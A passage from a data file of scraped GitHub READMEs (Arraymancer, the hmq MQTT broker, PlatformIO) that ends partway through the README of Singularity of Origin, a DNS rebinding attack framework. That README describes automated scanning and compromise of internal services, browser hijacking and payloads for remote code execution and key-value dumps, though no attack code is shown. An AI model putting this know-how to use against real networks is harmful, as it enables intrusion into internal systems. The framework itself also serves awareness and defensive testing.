30, 2018\nSo why Arraymancer ?\nAll those pain points may seem like a huge undertaking however thanks to the Nim language, we can have Arraymancer:\nBe as fast as C\nAccelerated routines with Intel MKL/OpenBLAS or even NNPACK\nAccess to CUDA and CuDNN and generate custom CUDA kernels on the fly via metaprogramming.\nAlmost dependency free distribution (BLAS library)\nA Python-like syntax with custom operators a * b for tensor multiplication instead of a.dot(b) (Numpy/Tensorflow) or a.mm(b) (Torch)\nNumpy-like slicing ergonomics t[0..4, 2..10|2]\nFor everything that Nim doesn't have yet, you can use Nim bindings to C, C++, Objective-C or Javascript to bring it to Nim. Nim also has unofficial Python->Nim and Nim->Python wrappers.\nFuture ambitions\nBecause apparently to be successful you need a vision, I would like Arraymancer to be:\nThe go-to tool for Deep Learning video processing. I.e. vid = load_video(\"./cats/youtube_cat_video.mkv\")\nTarget javascript, WebAssembly, Apple Metal, ARM devices, AMD Rocm, OpenCL, you name it.\nThe base of a Starcraft II AI bot.\nTarget cryptominers FPGAs because they drove the price of GPUs for honest deep-learners too high.", "link": "https://github.com/mratsim/Arraymancer", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arraymancer - a n-dimensional tensor (ndarray) library.\narraymancer is a tensor (n-dimensional array) project in nim. the main focus is providing a fast and ergonomic cpu, cuda and opencl ndarray library on which to build a scientific computing ecosystem.\nthe library is inspired by numpy and pytorch and targets the following use-cases:\nn-dimensional arrays (tensors) for numerical computing\nmachine learning algorithms (as in scikit-learn: least squares solvers, pca and dimensionality reduction, classifiers, regressors and clustering algorithms, cross-validation).\ndeep learning\nthe ndarray component can be used without the machine learning and deep learning component. it can also use the openmp, cuda or opencl backends.\nnote: while nim is compiled and does not offer an interactive repl yet (like jupyter), it allows much faster prototyping than c++ due to extremely fast compilation times. arraymancer compiles in about 5 seconds on my dual-core macbook.\nperformance notice on nim 0.20 & compilation flags\nin nim 0.20, the -d:release flag does not disable runtime checks like array bounds-checking anymore. this has a signigicant performance impact (5x slowdown in tight loop).\ncompile with -d:release -d:danger to get the same performance as in 0.19.x.\nreminder of supported compilation flags:\n-d:release: nim release mode (no stacktraces and debugging information)\n-d:danger: no runtime checks like array bound checking\n-d:openmp: multithreaded compilation\n-d:mkl: use mkl, implies openmp\n-d:openblas: use openblas\nby default arraymancer will try to use your default blas.so/blas.dll archlinux users may have to specify -d:blas=cblas. see nimblas for further configuration.\n-d:cuda: build with cuda support\n-d:cudnn: build with cudnn support, implies cuda.\nyou might want to tune library paths in nim.cfg after installation for openblas, mkl and cuda compilation. the current defaults should work on mac and linux.\nshow me some code\narraymancer tutorial is available here.\nhere is a preview of arraymancer syntax.\ntensor creation and slicing\nimport math, arraymancer\nconst\nx = @[1, 2, 3, 4, 5]\ny = @[1, 2, 3, 4, 5]\nvar\nvandermonde: seq[seq[int]]\nrow: seq[int]\nvandermonde = newseq[seq[int]]()\nfor i, xx in x:\nrow = newseq[int]()\nvandermonde.add(row)\nfor j, yy in y:\nvandermonde[i].add(xx^yy)\nlet foo = vandermonde.totensor()\necho foo\n# tensor of shape 5x5 of type \"int\" on backend \"cpu\"\n# |1 1 1 1 1|\n# |2 4 8 16 32|\n# |3 9 27 81 243|\n# |4 16 64 256 1024|\n# |5 25 125 625 3125|\necho foo[1..2, 3..4] # slice\n# tensor of shape 2x2 of type \"int\" on backend \"cpu\"\n# |16 32|\n# |81 243|\nreshaping and concatenation\nimport arraymancer, sequtils\nlet a = toseq(1..4).totensor.reshape(2,2)\nlet b = toseq(5..8).totensor.reshape(2,2)\nlet c = toseq(11..16).totensor\nlet c0 = c.reshape(3,2)\nlet c1 = c.reshape(2,3)\necho concat(a,b,c0, axis = 0)\n# tensor of shape 7x2 of type \"int\" on backend \"cpu\"\n# |1 2|\n# |3 4|\n# |5 6|\n# |7 8|\n# |11 12|\n# |13 14|\n# |15 16|\necho concat(a,b,c1, axis = 1)\n# tensor of shape 2x7 of type \"int\" on backend \"cpu\"\n# |1 2 5 6 11 12 13|\n# |3 4 7 8 14 15 16|\nbroadcasting\nimage from scipy\nimport arraymancer\nlet j = [0, 10, 20, 30].totensor.reshape(4,1)\nlet k = [0, 1, 2].totensor.reshape(1,3)\necho j +. k\n# tensor of shape 4x3 of type \"int\" on backend \"cpu\"\n# |0 1 2|\n# |10 11 12|\n# |20 21 22|\n# |30 31 32|\na simple two layers neural network\nfrom example 3.\nimport arraymancer, strformat\ndiscard \"\"\"\na fully-connected relu network with one hidden layer, trained to predict y from x\nby minimizing squared euclidean distance.\n\"\"\"\n# ##################################################################\n# environment variables\n# n is batch size; d_in is input dimension;\n# h is hidden dimension; d_out is output dimension.\nlet (n, d_in, h, d_out) = (64, 1000, 100, 10)\n# create the autograd context that will hold the computational graph\nlet ctx = newcontext tensor[float32]\n# create random tensors to hold inputs and outputs, and wrap them in variables.\nlet\nx = ctx.variable(randomtensor[float32](n, d_in, 1'f32))\ny = randomtensor[float32](n, d_out, 1'f32)\n# ##################################################################\n# define the model.\nnetwork ctx, twolayersnet:\nlayers:\nfc1: linear(d_in, h)\nfc2: linear(h, d_out)\nforward x:\nx.fc1.relu.fc2\nlet\nmodel = ctx.init(twolayersnet)\noptim = model.optimizersgd(learning_rate = 1e-4'f32)\n# ##################################################################\n# training\nfor t in 0 ..< 500:\nlet\ny_pred = model.forward(x)\nloss = y_pred.mse_loss(y)\necho &\"epoch {t}: loss {loss.value[0]}\"\nloss.backprop()\noptim.update()\nteaser a text generated with arraymancer's recurrent neural network\nfrom example 6.\ntrained 45 min on my laptop cpu on shakespeare and producing 4000 characters\nwhter!\ntake's servant seal'd, making uponweed but rascally guess-boot,\nbare them be that been all ingal to me;\nyour play to the see's wife the wrong-pars\nwith child of queer wretchless dreadful cold\ncursters will how your part? i prince!\nthis is time not in a without a tands:\nyou are but foul to this.\ni talk and fellows break my revenges, so, and of the hisod\nas you lords them or trues salt of the poort.\nromeo:\nthou hast facted to keep thee, and am speak\nof them; she's murder'd of your galla?\n# [...] see example 6 for full text generation samples\ntable of contents\narraymancer - a n-dimensional tensor (ndarray) library.\nperformance notice on nim 0.20 & compilation flags\nshow me some code\ntensor creation and slicing\nreshaping and concatenation\nbroadcasting\na simple two layers neural network\nteaser a text generated with arraymancer's recurrent neural network\ntable of contents\ninstallation\nfull documentation\nfeatures\narraymancer as a deep learning library\nfizzbuzz with fully-connected layers (also called dense, affine or linear layers)\nhandwritten digit recognition with convolutions\nsequence classification with stacked recurrent neural networks\ntensors on cpu, on cuda and opencl\nwhat's new in arraymancer v0.5.1 - july 2019\n4 reasons why arraymancer\nthe python community is struggling to bring numpy up-to-speed\na researcher workflow is a fight against inefficiencies\ncan be distributed almost dependency free\nbridging the gap between deep learning research and production\nso why arraymancer ?\nfuture ambitions\ninstallation\nnim is available in some linux repositories and on homebrew for macos.\ni however recommend installing nim in your user profile via choosenim. once choosenim installed nim, you can nimble install arraymancer which will pull the latest arraymancer release and all its dependencies.\nto install arraymancer development version you can use nimble install arraymancer@#head.\narraymancer requires a blas and lapack library.\non windows you can get openblas and lapack for windows.\non macos, apple accelerate framework is included in all macos versions and provides those.\non linux, you can download libopenblas and liblapack through your package manager.\nfull documentation\ndetailed api is available at arraymancer official documentation. note: this documentation is only generated for 0.x release. check the examples folder for the latest devel evolutions.\nfeatures\nfor now arraymancer is mostly at the multidimensional array stage, in particular arraymancer offers the following:\nbasic math operations generalized to tensors (sin, cos, ...)\nmatrix algebra primitives: matrix-matrix, matrix-vector multiplication.\neasy and efficient slicing including with ranges and steps.\nno need to worry about \"vectorized\" operations.\nbroadcasting support. unlike numpy it is explicit, you just need to use +. instead of +.\nplenty of reshaping operations: concat, reshape, split, chunk, permute, transpose.\nsupports tensors of up to 6 dimensions. for example a stack of 4 3d rgb minifilms of 10 seconds would be 6 dimensions: [4, 10, 3, 64, 1920, 1080] for [nb_movies, time, colors, depth, height, width]\ncan read and write .csv, numpy (.npy) and hdf5 files.\nopencl and cuda backed tensors (not as feature packed as cpu tensors at the moment).\ncovariance matrices.\neigenvalues and eigenvectors decomposition.\nleast squares solver.\nk-means and pca (principal component analysis).\narraymancer as a deep learning library\ndeep learning features can be explored but are considered unstable while i iron out their final interface.\nreminder: the final interface is still work in progress.\nyou can also watch the following animated neural network demo which shows live training via nim-plotly.\nfizzbuzz with fully-connected layers (also called dense, affine or linear layers)\nneural network definition extracted from example 4.\nconst\nnumdigits = 10\nnumhidden = 100\nlet ctx = newcontext tensor[float32]\nnetwork ctx, fizzbuzznet:\nlayers:\nhidden: linear(numdigits, numhidden)\noutput: linear(numhidden, 4)\nforward x:\nx.hidden.relu.output\nlet model = ctx.init(fizzbuzznet)\nlet optim = model.optimizersgd(0.05'f32)\n# ....\necho answer\n# @[\"1\", \"2\", \"fizz\", \"4\", \"buzz\", \"6\", \"7\", \"8\", \"fizz\", \"10\",\n# \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"fizz\", \"19\", \"buzz\",\n# \"fizz\", \"22\", \"23\", \"24\", \"buzz\", \"26\", \"fizz\", \"28\", \"29\", \"30\",\n# \"31\", \"32\", \"fizz\", \"34\", \"buzz\", \"36\", \"37\", \"38\", \"39\", \"40\",\n# \"41\", \"fizz\", \"43\", \"44\", \"fizzbuzz\", \"46\", \"47\", \"fizz\", \"49\", \"50\",\n# \"fizz\", \"52\",\"53\", \"54\", \"buzz\", \"56\", \"fizz\", \"58\", \"59\", \"fizzbuzz\",\n# \"61\", \"62\", \"63\", \"64\", \"buzz\", \"fizz\", \"67\", \"68\", \"fizz\", \"buzz\",\n# \"71\", \"fizz\", \"73\", \"74\", \"75\", \"76\", \"77\",\"fizz\", \"79\", \"buzz\",\n# \"fizz\", \"82\", \"83\", \"fizz\", \"buzz\", \"86\", \"fizz\", \"88\", \"89\", \"90\",\n# \"91\", \"92\", \"fizz\", \"94\", \"buzz\", \"fizz\", \"97\", \"98\", \"fizz\", \"buzz\"]\nhandwritten digit recognition with convolutions\nneural network definition extracted from example 2.\nlet ctx = newcontext tensor[float32] # autograd/neural network graph\nnetwork ctx, demonet:\nlayers:\nx: input([1, 28, 28])\ncv1: conv2d(x.out_shape, 20, 5, 5)\nmp1: maxpool2d(cv1.out_shape, (2,2), (0,0), (2,2))\ncv2: conv2d(mp1.out_shape, 50, 5, 5)\nmp2: maxpool2d(cv2.out_shape, (2,2), (0,0), (2,2))\nfl: flatten(mp2.out_shape)\nhidden: linear(fl.out_shape, 500)\nclassifier: linear(500, 10)\nforward x:\nx.cv1.relu.mp1.cv2.relu.mp2.fl.hidden.relu.classifier\nlet model = ctx.init(demonet)\nlet optim = model.optimizersgd(learning_rate = 0.01'f32)\n# ...\n# accuracy over 90% in a couple minutes on a laptop cpu\nsequence classification with stacked recurrent neural networks\nneural network definition extracted example 5.\nconst\nhiddensize = 256\nlayers = 4\nbatchsize = 512\nlet ctx = newcontext tensor[float32]\nnetwork ctx, thegreatsequencer:\nlayers:\n# note input_shape will only require the number of features in the future\n# input shape = [seq_len, batch_size, features]\ngru1: gru([3, batch_size, 1], hiddensize, 4) # (input_shape, hidden_size, stacked_layers)\nfc1: linear(hiddensize, 32) # 1 classifier per gru layer\nfc2: linear(hiddensize, 32)\nfc3: linear(hiddensize, 32)\nfc4: linear(hiddensize, 32)\nclassifier: linear(32 * 4, 3) # stacking a classifier which learns from the other 4\nforward x, hidden0:\nlet\n(output, hiddenn) = gru1(x, hidden0)\nclf1 = hiddenn[0, _, _].squeeze(0).fc1.relu\nclf2 = hiddenn[1, _, _].squeeze(0).fc2.relu\nclf3 = hiddenn[2, _, _].squeeze(0).fc3.relu\nclf4 = hiddenn[3, _, _].squeeze(0).fc4.relu\n# concat all\n# since concat backprop is not implemented we cheat by stacking\n# then flatten\nresult = stack(clf1, clf2, clf3, clf4, axis = 2)\nresult = classifier(result.flatten)\n# allocate the model\nlet model = ctx.init(thegreatsequencer)\nlet optim = model.optimizersgd(0.01'f32)\n# ...\nlet exam = ctx.variable([\n[float32 0.10, 0.20, 0.30], # increasing\n[float32 0.10, 0.90, 0.95], # increasing\n[float32 0.45, 0.50, 0.55], # increasing\n[float32 0.10, 0.30, 0.20], # non-monotonic\n[float32 0.20, 0.10, 0.30], # non-monotonic\n[float32 0.98, 0.97, 0.96], # decreasing\n[float32 0.12, 0.05, 0.01], # decreasing\n[float32 0.95, 0.05, 0.07] # non-monotonic\n# ...\necho answer.unsqueeze(1)\n# tensor[ex05_sequence_classification_gru.seqkind] of shape [8, 1] of type \"seqkind\" on backend \"cpu\"\n#  increasing|\n#  increasing|\n#  increasing|\n#  nonmonotonic|\n#  nonmonotonic|\n#  increasing| <----- wrong!\n#  decreasing|\n#  nonmonotonic|\ntensors on cpu, on cuda and opencl\ntensors, cudatensors and cltensors do not have the same features implemented yet. also cudatensors and cltensors can only be float32 or float64 while cputensors can be integers, string, boolean or any custom object.\nhere is a comparative table of the core features.\naction tensor cudatensor cltensor\naccessing tensor properties [x] [x] [x]\ntensor creation [x] by converting a cpu tensor by converting a cpu tensor\naccessing or modifying a single value [x] [] []\niterating on a tensor [x] [] []\nslicing a tensor [x] [x] [x]\nslice mutation a[1,_] = 10 [x] [] []\ncomparison == [x] [] []\nelement-wise basic operations [x] [x] [x]\nuniversal functions [x] [] []\nautomatically broadcasted operations [x] [x] [x]\nmatrix-matrix and matrix-vector multiplication [x] [x] [x]\ndisplaying a tensor [x] [x] [x]\nhigher-order functions (map, apply, reduce, fold) [x] internal only internal only\ntransposing [x] [x] []\nconverting to contiguous [x] [x] []\nreshaping [x] [x] []\nexplicit broadcast [x] [x] [x]\npermuting dimensions [x] [] []\nconcatenating tensors along existing dimension [x] [] []\nsqueezing singleton dimension [x] [x] []\nslicing + squeezing [x] [] []\nwhat's new in arraymancer v0.5.1 - july 2019\nthe full changelog is available in changelog.md.\nhere are the highlights:\n0.20.x compatibility\ncomplex support\neinsum\nnaive whitespace tokenizer for nlp\nfix height/width order when reading an image in tensor\npreview of laser backend for matrix multiplication without simd autodetection (already 5x faster on integer matrix multiplication)\n4 reasons why arraymancer\nthe python community is struggling to bring numpy up-to-speed\nnumba jit compiler\ndask delayed parallel computation graph\ncython to ease numerical computations in python\ndue to the gil shared-memory parallelism (openmp) is not possible in pure python\nuse \"vectorized operations\" (i.e. don't use for loops in python)\nwhy not use in a single language with all the blocks to build the most efficient scientific computing library with python ergonomics.\nopenmp batteries included.\na researcher workflow is a fight against inefficiencies\nresearchers in a heavy scientific computing domain often have the following workflow: mathematica/matlab/python/r (prototyping) -> c/c++/fortran (speed, memory)\nwhy not use in a language as productive as python and as fast as c? code once, and don't spend months redoing the same thing at a lower level.\ncan be distributed almost dependency free\narraymancer models can be packaged in a self-contained binary that only depends on a blas library like openblas, mkl or apple accelerate (present on all mac and ios).\nthis means that there is no need to install a huge library or language ecosystem to use arraymancer. this also makes it naturally suitable for resource-constrained devices like mobile phones and raspberry pi.\nbridging the gap between deep learning research and production\nthe deep learning frameworks are currently in two camps:\nresearch: theano, tensorflow, keras, torch, pytorch\nproduction: caffe, darknet, (tensorflow)\nfurthermore, python preprocessing steps, unless using opencv, often needs a custom implementation (think text/speech preprocessing on phones).\nmanaging and deploying python (2.7, 3.5, 3.6) and packages version in a robust manner requires devops-fu (virtualenv, docker, ...)\npython data science ecosystem does not run on embedded devices (nvidia tegra/drones) or mobile phones, especially preprocessing dependencies.\ntensorflow is supposed to bridge the gap between research and production but its syntax and ergonomics are a pain to work with. like for researchers, you need to code twice, \"prototype in keras, and when you need low-level --> tensorflow\".\ndeployed models are static, there is no interface to add a new observation/training sample to any framework, what if you want to use a model as a webservice with online learning?\nrelevant xkcd from apr 30, 2018\nso why arraymancer ?\nall those pain points may seem like a huge undertaking however thanks to the nim language, we can have arraymancer:\nbe as fast as c\naccelerated routines with intel mkl/openblas or even nnpack\naccess to cuda and cudnn and generate custom cuda kernels on the fly via metaprogramming.\nalmost dependency free distribution (blas library)\na python-like syntax with custom operators a * b for tensor multiplication instead of a.dot(b) (numpy/tensorflow) or a.mm(b) (torch)\nnumpy-like slicing ergonomics t[0..4, 2..10|2]\nfor everything that nim doesn't have yet, you can use nim bindings to c, c++, objective-c or javascript to bring it to nim. nim also has unofficial python->nim and nim->python wrappers.\nfuture ambitions\nbecause apparently to be successful you need a vision, i would like arraymancer to be:\nthe go-to -----> tool !!!  for deep learning video processing. i.e. vid = load_video(\"./cats/youtube_cat_video.mkv\")\ntarget javascript, webassembly, apple metal, arm devices, amd rocm, opencl, you name it.\nthe base of a starcraft ii ai bot.\ntarget cryptominers fpgas because they drove the price of gpus for honest deep-learners too high.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000125, "year": null}, {"Unnamed: 0": 126, "autor": 126, "date": null, "content": "Free and High Performance MQTT Broker\nAbout\nGolang MQTT Broker, Version 3.1.1, and Compatible for eclipse paho client and mosquitto-client\nRUNNING\n$ go get github.com/fhmq/hmq\n$ cd $GOPATH/github.com/fhmq/hmq\n$ go run main.go\nUsage of hmq:\nUsage: hmq [options]\nBroker Options:\n-w, --worker <number> Worker num to process message, perfer (client num)/10. (default 1024)\n-p, --port <port> Use port for clients (default: 1883)\n--host <host> Network host to listen on. (default \"0.0.0.0\")\n-ws, --wsport <port> Use port for websocket monitoring\n-wsp,--wspath <path> Use path for websocket monitoring\n-c, --config <file> Configuration file\nLogging Options:\n-d, --debug <bool> Enable debugging output (default false)\n-D Debug enabled\nCluster Options:\n-r, --router <rurl> Router who maintenance cluster info\n-cp, --clusterport <cluster-port> Cluster listen port for others\nCommon Options:\n-h, --help Show this message\nhmq.config\n{\n\"workerNum\": 4096,\n\"port\": \"1883\",\n\"host\": \"0.0.0.0\",\n\"cluster\": {\n\"host\": \"0.0.0.0\",\n\"port\": \"1993\"\n},\n\"router\": \"127.0.0.1:9888\",\n\"wsPort\": \"1888\",\n\"wsPath\": \"/ws\",\n\"wsTLS\": true,\n\"tlsPort\": \"8883\",\n\"tlsHost\": \"0.0.0.0\",\n\"tlsInfo\": {\n\"verify\": true,\n\"caFile\": \"tls/ca/cacert.pem\",\n\"certFile\": \"tls/server/cert.pem\",\n\"keyFile\": \"tls/server/key.pem\"\n},\n\"plugins\": {\n\"auth\": \"authhttp\",\n\"bridge\": \"kafka\"\n}\n}\nFeatures and Future\nSupports QOS 0 and 1\nCluster Support\nContainerization\nSupports retained messages\nSupports will messages\nWebsocket Support\nTLS/SSL Support\nAuth Support\nAuth Connect\nAuth ACL\nCache Support\nKafka Bridge Support\nAction Deliver\nRegexp Deliver\nHTTP API\nDisconnect Connect (future more)\nShare SUBSCRIBE\n| Prefix | Examples | Publish |\n| ------------------- |-------------------------------------------|--------------------------- --|\n| $share/<group>/topic | mosquitto_sub -t \u2018$share/<group>/topic\u2019 | mosquitto_pub -t \u2018topic\u2019 |\nCluster\n1, start router for hmq (https://github.com/fhmq/router.git)\n$ go get github.com/fhmq/router\n$ cd $GOPATH/github.com/fhmq/router\n$ go run main.go\n2, config router in hmq.config (\"router\": \"127.0.0.1:9888\")\nOther Version Of Cluster Based On gRPC: click here\nOnline/Offline Notification\ntopic:\n$SYS/broker/connection/clients/<clientID>\npayload:\n{\"clientID\":\"client001\",\"online\":true/false,\"timestamp\":\"2018-10-25T09:32:32Z\"}\nPerformance\nHigh throughput\nHigh concurrency\nLow memory and CPU\nLicense\nApache License Version 2.0\nReference\nSurgermq.(https://github.com/surgemq/surgemq)\nBenchmark Tool\nhttps://github.com/inovex/mqtt-stresser\nhttps://github.com/krylovsk/mqtt-benchmark", "link": "https://github.com/fhmq/hmq", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "free and high performance mqtt broker\nabout\ngolang mqtt broker, version 3.1.1, and compatible for eclipse paho client and mosquitto-client\nrunning\n$ go get github.com/fhmq/hmq\n$ cd $gopath/github.com/fhmq/hmq\n$ go run main.go\nusage of hmq:\nusage: hmq [options]\nbroker options:\n-w, --worker <number> worker num to process message, perfer (client num)/10. (default 1024)\n-p, --port <port> use port for clients (default: 1883)\n--host <host> network host to listen on. (default \"0.0.0.0\")\n-ws, --wsport <port> use port for websocket monitoring\n-wsp,--wspath <path> use path for websocket monitoring\n-c, --config <file> configuration file\nlogging options:\n-d, --debug <bool> enable debugging output (default false)\n-d debug enabled\ncluster options:\n-r, --router <rurl> router who maintenance cluster info\n-cp, --clusterport <cluster-port> cluster listen port for others\ncommon options:\n-h, --help show this message\nhmq.config\n{\n\"workernum\": 4096,\n\"port\": \"1883\",\n\"host\": \"0.0.0.0\",\n\"cluster\": {\n\"host\": \"0.0.0.0\",\n\"port\": \"1993\"\n},\n\"router\": \"127.0.0.1:9888\",\n\"wsport\": \"1888\",\n\"wspath\": \"/ws\",\n\"wstls\": true,\n\"tlsport\": \"8883\",\n\"tlshost\": \"0.0.0.0\",\n\"tlsinfo\": {\n\"verify\": true,\n\"cafile\": \"tls/ca/cacert.pem\",\n\"certfile\": \"tls/server/cert.pem\",\n\"keyfile\": \"tls/server/key.pem\"\n},\n\"plugins\": {\n\"auth\": \"authhttp\",\n\"bridge\": \"kafka\"\n}\n}\nfeatures and future\nsupports qos 0 and 1\ncluster support\ncontainerization\nsupports retained messages\nsupports will messages\nwebsocket support\ntls/ssl support\nauth support\nauth connect\nauth acl\ncache support\nkafka bridge support\naction deliver\nregexp deliver\nhttp api\ndisconnect connect (future more)\nshare subscribe\n| prefix | examples | publish |\n| ------------------- |-------------------------------------------|--------------------------- --|\n| $share/<group>/topic | mosquitto_sub -t \u2018$share/<group>/topic\u2019 | mosquitto_pub -t \u2018topic\u2019 |\ncluster\n1, start router for hmq (https://github.com/fhmq/router.git)\n$ go get github.com/fhmq/router\n$ cd $gopath/github.com/fhmq/router\n$ go run main.go\n2, config router in hmq.config (\"router\": \"127.0.0.1:9888\")\nother version of cluster based on grpc: click here\nonline/offline notification\ntopic:\n$sys/broker/connection/clients/<clientid>\npayload:\n{\"clientid\":\"client001\",\"online\":true/false,\"timestamp\":\"2018-10-25t09:32:32z\"}\nperformance\nhigh throughput\nhigh concurrency\nlow memory and cpu\nlicense\napache license version 2.0\nreference\nsurgermq.(https://github.com/surgemq/surgemq)\nbenchmark -----> tool !!! \nhttps://github.com/inovex/mqtt-stresser\nhttps://github.com/krylovsk/mqtt-benchmark", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000126, "year": null}, {"Unnamed: 0": 139, "autor": 139, "date": null, "content": "PlatformIO IDE for VSCode\nPlatformIO is a professional collaborative platform for embedded development.\nA place where Developers and Teams have true Freedom! No more vendor lock-in!\nOpen source, maximum permissive Apache 2.0 license\nCross-platform IDE and Unified Debugger\nStatic Code Analyzer and Remote Unit Testing\nMulti-platform and Multi-architecture Build System\nFirmware File Explorer and Memory Inspection.\nPlatforms: Atmel AVR, Atmel SAM, Espressif 32, Espressif 8266, Freescale Kinetis, Infineon XMC, Intel ARC32, Intel MCS-51 (8051), Kendryte K210, Lattice iCE40, Maxim 32, Microchip PIC32, Nordic nRF51, Nordic nRF52, NXP LPC, RISC-V, Samsung ARTIK, Silicon Labs EFM32, ST STM32, ST STM8, Teensy, TI MSP430, TI Tiva, WIZNet W7500\nFrameworks: Arduino, ARTIK SDK, CMSIS, ESP-IDF, ESP8266 RTOS SDK, Freedom E SDK, Kendryte Standalone SDK, Kendryte FreeRTOS SDK, libOpenCM3, mbed, PULP OS, Pumbaa, Simba, SPL, STM32Cube, Tizen RT, WiringPi, Zephyr RTOS\nFeatures\nCross-platform code builder without external dependencies to a system software:\n1000+ embedded boards\n40+ development platforms\n20+ frameworks\nDebugging\nUnit Testing\nStatic Code Analysis\nRemote Development\nC/C++ Intelligent Code Completion\nC/C++ Smart Code Linter for rapid professional development\nLibrary Manager for the thousands of popular libraries\nMulti-projects workflow with multiple panes\nThemes support with dark and light colors\nSerial Port Monitor\nBuilt-in Terminal with PlatformIO Core tool (pio, platformio)\nHow it works\n!!! PLEASE READ \"QUICK START\" AND \"USER GUIDE\" BEFORE !!!\nInstallation\nQuick Start\nUser Guide\nPlease follow to the official documentation PlatformIO IDE for VSCode.\nLicense\nCopyright (C) 2017-present PlatformIO contact@platformio.org\nThe PlatformIO IDE for VSCode is licensed under the permissive Apache 2.0 license, so you can use it in both commercial and personal projects with confidence.", "link": "https://github.com/platformio/platformio-vscode-ide", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "platformio ide for vscode\nplatformio is a professional collaborative platform for embedded development.\na place where developers and teams have true freedom! no more vendor lock-in!\nopen source, maximum permissive apache 2.0 license\ncross-platform ide and unified debugger\nstatic code analyzer and remote unit testing\nmulti-platform and multi-architecture build system\nfirmware file explorer and memory inspection.\nplatforms: atmel avr, atmel sam, espressif 32, espressif 8266, freescale kinetis, infineon xmc, intel arc32, intel mcs-51 (8051), kendryte k210, lattice ice40, maxim 32, microchip pic32, nordic nrf51, nordic nrf52, nxp lpc, risc-v, samsung artik, silicon labs efm32, st stm32, st stm8, teensy, ti msp430, ti tiva, wiznet w7500\nframeworks: arduino, artik sdk, cmsis, esp-idf, esp8266 rtos sdk, freedom e sdk, kendryte standalone sdk, kendryte freertos sdk, libopencm3, mbed, pulp os, pumbaa, simba, spl, stm32cube, tizen rt, wiringpi, zephyr rtos\nfeatures\ncross-platform code builder without external dependencies to a system software:\n1000+ embedded boards\n40+ development platforms\n20+ frameworks\ndebugging\nunit testing\nstatic code analysis\nremote development\nc/c++ intelligent code completion\nc/c++ smart code linter for rapid professional development\nlibrary manager for the thousands of popular libraries\nmulti-projects workflow with multiple panes\nthemes support with dark and light colors\nserial port monitor\nbuilt-in terminal with platformio core -----> tool !!!  (pio, platformio)\nhow it works\n!!! please read \"quick start\" and \"user guide\" before !!!\ninstallation\nquick start\nuser guide\nplease follow to the official documentation platformio ide for vscode.\nlicense\ncopyright (c) 2017-present platformio contact@platformio.org\nthe platformio ide for vscode is licensed under the permissive apache 2.0 license, so you can use it in both commercial and personal projects with confidence.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000139, "year": null}, {"Unnamed: 0": 146, "autor": 146, "date": null, "content": "Singularity of Origin\nNEW (2020-03-30): New blog post investigating the impact of DoH on DNS rebinding attacks. TL;DR: DoH (DNS over HTTPS) has no effect on rebinding attacks and protections advertised by providers can be bypassed.\nNEW! The WebRTC leak, which permitted to obtain the internal IP address of a target machine has been fixed in recent version of Google Chrome and Apple Safari. It still works on Firefox.\nNEW! Check out our DEF CON 27 video and BSidesLV presentation at State of DNS Rebinding: Attack & Prevention Techniques and the Singularity of Origin\nSingularity of Origin is a tool to perform DNS rebinding attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack payloads to exploit vulnerable software on the target machine.\nIt also ships with sample payloads to exploit several vulnerable software versions, from the simple capture of a home page to performing remote code execution. It aims at providing a framework to facilitate the exploitation of software vulnerable to DNS rebinding attacks and to raise awareness on how they work and how to protect from them.\nDetailed documentation is on the wiki pages.\nCore Features\nSingularity provides a complete DNS rebinding attack delivery stack:\nCustom DNS server to rebind DNS name and IP address\nHTTP server (manager web interface) to serve HTML pages and JavaScript code to targets and to manage the attacks\nSeveral sample attack payloads, ranging from grabbing the home page of a target application to performing remote code execution. These payloads can be easily adapted to perform new and custom attacks.\nSupports DNS CNAME values in target specification in addition to IP addresses to evade DNS filtering solutions or to target internal resources for which the IP address is unknown.\nA simple, fast and efficient HTTP port scanner to identify vulnerable services.\nAttack automation allows to completely automate the scanning and exploitation of vulnerable services on a network.\nHook and Control permits using victim web browsers as HTTP proxies to access internal network resources, to interactively explore and exploit otherwise inaccessible applications with your own browser.\nSingularity Manager Interface\nHook and Control a Vulnerable Application on Localhost or Other Hosts\nAutomate the Scan and Compromise of All Vulnerables Applications\nUsage\nSetting up Singularity requires a DNS domain name where you can edit your own DNS records for your domain and a Linux server to run it. Please see the setup singularity wiki page for detailed instructions.\nThe documentation is on the wiki pages. Here are a few pointers to start:\nWhat are DNS Rebinding Attacks?\nPreventing DNS Rebinding Attacks\nSetup and Installation\nDescription of existing Payloads and how to write your own\nA test instance is available for demo purposes at http://rebind.it:8080/manager.html.\nSpeed\nSingularity has been tested to work with the following browsers in optimal conditions in under 3 seconds:\nBrowser Operating System Time to Exploit Rebinding Strategy Fetch Interval Target Specification\nChrome Windows 10 ~3s Multiple answers (fast) 1s 127.0.0.1\nEdge Windows 10 ~3s Multiple answers (fast) 1s 127.0.0.1\nFirefox Windows 10 ~3s Multiple answers (fast) 1s 127.0.0.1\nChromium Ubuntu ~3s Multiple answers (fast) 1s 0.0.0.0\nFirefox Ubuntu ~3s Multiple answers (fast) 1s 0.0.0.0\nChrome macOS ~3s Multiple answers (fast) 1s 0.0.0.0\nFirefox macOS ~3s Multiple answers (fast) 1s 0.0.0.0\nSafari macOS ~3s Multiple answers (fast) 1s 0.0.0.0\nPayloads Description\nSingularity supports the following attack payloads:\nBasic fetch request (simple-fetch-get.js): This sample payload makes a GET request to the root directory ('/') and shows the server response using the fetch API. The goal of this payload is to function as example request to make additional contributions as easy as possible.\nautomatic: This payload automatically attempts to detect known services and exploit them using other payloads listed in this section or that were developed and added to Singularity by users.\nChrome DevTools RCE (exposed-chrome-devtools.js): This payload demonstrates a remote code execution (RCE) vulnerability in Microsoft VS Code fixed in version 1.19.3. This payload can be adapted to exploit any software that exposes Chrome Dev Tools on localhost.\nEtcd k/v dump (etcd.js): This payload retrieves the keys and values from the etcd key-value store.\npyethapp (pyethapp.js): Exploits the Python implementation of the Ethereum client Pyethapp to get the list of owned eth 